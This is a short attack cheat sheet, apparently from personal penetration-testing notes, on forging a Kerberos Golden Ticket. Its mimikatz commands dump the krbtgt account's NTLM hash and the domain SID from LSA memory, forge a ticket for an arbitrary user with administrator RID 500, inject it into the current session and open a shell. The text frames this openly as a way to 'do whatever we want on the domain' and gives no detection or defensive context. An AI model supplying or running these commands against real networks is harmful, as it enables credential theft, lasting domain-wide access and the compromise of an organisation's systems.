-- -
This is taking over the Kerberos Ticket Granting Ticket #krbtgt, which is the service that grants tickets to every resource and service in the domain, so you are creating a ticket that has access to anything on the domain, meaning we can use it to do whatever we want on the domain. 
#### Requirements
1. #krbtgt NTLM hash
2. Domain SID
#### mimikatz
```powershell
privilege::debug

# dump hashes and info for krbtgt account
# looking for:
# 1) domain SID
# 2) NTLM Hash
lsadump::lsa /inject /name:krbtgt 

# Generate Golden Ticket
# User field can be whatever you want it to be, made up account or real
kerberos::golden /User:<username> /domain:<domain> /sid:<domain SID> /krbtgt:<krbtgt NTLM hash> /id:500 /ptt

# Golden ticket will be generated and applied to the current session i.e the current shell session, so drop into a shell to use it:
misc::cmd
```